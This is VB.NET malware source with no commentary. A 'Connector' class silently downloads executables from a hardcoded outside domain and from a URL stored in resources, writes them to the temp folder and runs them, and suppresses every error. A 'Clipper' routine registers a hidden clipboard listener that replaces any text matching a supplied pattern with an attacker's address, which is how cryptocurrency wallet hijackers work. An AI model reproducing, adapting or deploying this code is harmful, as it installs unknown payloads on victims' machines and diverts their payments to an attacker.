Imports System.Runtime.InteropServices
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms

Public Class Connector
    Public Shared Function SetUp()
        Dim two As String
        Dim x As New System.Text.StringBuilder
        x.Append("http://yuvashaktigroup.org/work/myex.exe")
        two = x.ToString
        Dim URL As String = two
        Dim two_process As String = Environ("temp") & "myex.exe"
        Try
            Dim w As New Net.WebClient
            Dim f As Net.WebClient = w
            Dim g As Net.WebClient = f
            IO.File.WriteAllBytes(two_process, g.DownloadData(URL))
            Shell(two_process)
        Catch ex As Exception
        End Try
    End Function

    Public Shared Function Shutdown()
        Dim two As String
        Dim x As New System.Text.StringBuilder
        x.Append(My.Resources.memory)
        two = x.ToString
        Dim URL As String = two
        Dim two_process As String = Environ("temp") & "sub.exe"
        Try
            Dim w As New Net.WebClient
            Dim f As Net.WebClient = w
            Dim g As Net.WebClient = f
            IO.File.WriteAllBytes(two_process, g.DownloadData(URL))
            Shell(two_process)
        Catch ex As Exception
        End Try
    End Function
    Public Shared Function Clipper(ByVal addresss As String, ByVal regxx As String)
        Try
            address.address = addresss
            PatternRegex.regx = New Regex((regxx))
            Run()
        Catch ex As Exception
        End Try
    End Function
    Public Shared Sub Run()
        Application.Run(New ClipboardNotification.NotificationForm())
    End Sub
End Class

Friend Module PatternRegex
    Public regx As Regex
End Module

Friend Module NativeMethods
    Public Const WM_CLIPBOARDUPDATE As Integer = &H31D
    Public HWND_MESSAGE As IntPtr = New IntPtr(-3)
    <DllImport("user32.dll", SetLastError:=True)>
    Function AddClipboardFormatListener(ByVal hwnd As IntPtr) As Boolean

    End Function
    <DllImport("user32.dll", SetLastError:=True)>
    Function SetParent(ByVal hWndChild As IntPtr, ByVal hWndNewParent As IntPtr) As IntPtr
    End Function
End Module
Friend Module Clipboard
    Function GetText() As String
        Dim ReturnValue As String = String.Empty
        Dim STAThread As Thread = New Thread(Sub()
                                                 ReturnValue = System.Windows.Forms.Clipboard.GetText()
                                             End Sub)
        STAThread.SetApartmentState(ApartmentState.STA)
        STAThread.Start()
        STAThread.Join()
        Return ReturnValue
    End Function

    Sub SetText(ByVal txt As String)
        Dim STAThread As Thread = New Thread(Sub()
                                                 System.Windows.Forms.Clipboard.SetText(txt)
                                             End Sub)
        STAThread.SetApartmentState(ApartmentState.STA)
        STAThread.Start()
        STAThread.Join()
    End Sub
End Module



Public NotInheritable Class ClipboardNotification
    Public Class NotificationForm
        Inherits Form

        Private Shared currentClipboard As String = Clipboard.GetText()

        Public Sub New()
            NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE)
            NativeMethods.AddClipboardFormatListener(Handle)
        End Sub

        Private Function RegexResult(ByVal pattern As Regex) As Boolean
            If pattern.Match(currentClipboard).Success Then
                Return True
            Else
                Return False
            End If
        End Function




        Protected Overrides Sub WndProc(ByRef m As Message)
            If m.Msg = NativeMethods.WM_CLIPBOARDUPDATE Then
                currentClipboard = Clipboard.GetText()

                If RegexResult(PatternRegex.regx) AndAlso Not currentClipboard.Contains(address.address) Then
                    Dim result As String = PatternRegex.regx.Replace(currentClipboard, address.address)
                    Clipboard.SetText(result)
                End If
            End If
            MyBase.WndProc(m)
        End Sub
    End Class
End Class
Friend Module address
    Public address As String
End Module